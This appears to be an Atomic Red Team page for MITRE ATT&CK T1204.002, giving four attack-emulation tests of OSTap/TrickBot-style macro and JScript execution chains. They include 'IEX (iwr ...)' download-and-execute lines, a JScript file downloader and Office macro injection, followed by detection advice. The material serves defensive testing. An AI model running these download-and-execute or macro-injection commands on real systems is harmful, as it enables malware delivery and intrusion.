# T1204.002 - User Execution: Malicious Link
An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.

Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) on the file to increase the likelihood that a user will open it.

While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - OSTap Style Macro Execution
This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.

This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns
References:
  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
```

Invoke-AtomicTest T1204.002 -TestNumbers 1

### Atomic Test #2 - OSTap Payload Download
Uses cscript //E:jscript to download a file

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
cscript //E:Jscript #{script_file}
```

Invoke-AtomicTest T1204.002 -TestNumbers 2

### Atomic Test #3 - Maldoc choice flags command execution
This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
```

Invoke-AtomicTest T1204.002 -TestNumbers 3

### Atomic Test #4 - OSTAP JS version
Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript

Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
```

Invoke-AtomicTest T1204.002 -TestNumbers 4

## Detection
Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.

Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).